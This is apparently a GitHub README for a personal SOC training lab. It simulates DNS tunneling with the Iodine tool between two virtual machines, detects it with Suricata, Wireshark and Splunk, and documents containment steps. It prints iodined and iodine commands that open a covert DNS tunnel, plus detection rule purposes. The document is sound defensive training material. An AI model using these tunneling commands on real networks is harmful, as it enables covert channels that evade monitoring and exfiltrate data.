

# DNS Tunneling Detection via Iodine

**Author:** Esosa Okonedo  
**Date Completed:** May 22nd, 2025

---

## Overview

This project simulates a DNS Tunneling attack using the **Iodine** tool in a controlled virtual lab environment. The goal was to detect and analyze the malicious activity using industry-standard tools: **Suricata (IDS)**, **Wireshark (packet analysis)**, and **Splunk (SIEM)**.

While no real-world data exfiltration occurred, this project showcases how DNS can be abused for covert communication and how security teams can effectively detect and respond to such threats.

---

## Objectives

- Simulate DNS tunneling using Iodine between two virtual machines.
- Detect suspicious DNS traffic with Suricata IDS.
- Analyze network packets using Wireshark.
- Correlate and visualize IDS alerts in Splunk.
- Practice incident response and containment steps.
- Document root cause, lessons learned, and recommendations.

---

## Lab Environment

| Component     | Details                          |
|---------------|----------------------------------|
| Client VM     | Ubuntu (192.168.1.31)            |
| Server VM     | Kali Linux (192.168.1.59)        |
| DNS Tunneling Tool | Iodine                     |
| Network       | 192.168.1.0/24 (Internal Lab)    |
| IDS           | Suricata                         |
| Packet Capture| Wireshark                        |
| SIEM          | Splunk                           |

---

## Tools Used

- **Iodine** – DNS tunneling tool for simulating exfiltration.
- **Suricata** – IDS used to trigger alerts on suspicious DNS behavior.
- **Wireshark** – For packet inspection and identifying malformed DNS queries.
- **Splunk** – For ingesting Suricata logs and correlating alerts.
- **Iptables** – Used to block traffic as part of the containment response.

---

## Key Suricata Rules Used

| SID       | Purpose                                     |
|-----------|---------------------------------------------|
| 2029994   | Detect NULL DNS record queries              |
| 2029995   | Detect long DNS queries (Iodine signature)  |
| 1000003   | Custom: Detect DNS NULL Record              |
| 1000005   | Custom: Detect high-volume DNS tunneling    |

---

## Simulation Steps

### Iodine Server Setup (Kali VM):
```bash
sudo apt update && sudo apt install iodine
sudo iodined -f -c -P secret123 10.0.0.1 tunnel.local
```

### Iodine Client Setup (Ubuntu VM):
```bash
sudo apt update && sudo apt install iodine
sudo iodine -f -P secret123 192.168.1.59 tunnel.local
```

### Generated Traffic:
```bash
ping 10.0.0.1
sudo ssh kali@10.0.0.1
```

---

## Detection & Analysis
- Suricata triggered alerts on suspicious DNS traffic.
- Wireshark captured malformed DNS packets with type 10 (NULL).
- Splunk confirmed high-volume DNS queries from the client VM with the relevant SIDs.

---
## Response actions
- Containment: Used iptables to block outbound DNS from the client.
- Isolation: Disconnected the client VM from the network using VirtualBox’s "Not Attached" setting.
- Eradication & Recovery: Stopped the Iodine process on both VMs.
- Recovery: Verified normal traffic resumed with no DNS tunneling detected.
- Reporting: The incident was reported to the SOC lead (simulated).

---
## Recommendations
- Implement DNS filtering with tools like pfSense.
- Conduct regular training on DNS tunneling and detection.
- Monitor DNS query patterns and alert on anomalies (e.g., long subdomains, NULL records).

---
## Acknowledgment
This project was done as part of my personal SOC training and blue team practice, inspired by real-world DNS tunneling techniques.

---
- [Download complete PDF Report](https://github.com/EsosaSEC/DNS-Tunneling-detection-iodine/blob/main/Incident%20Report-%20Detection%20of%20DNS%20Tunneling%20Attack.pdf)
- [
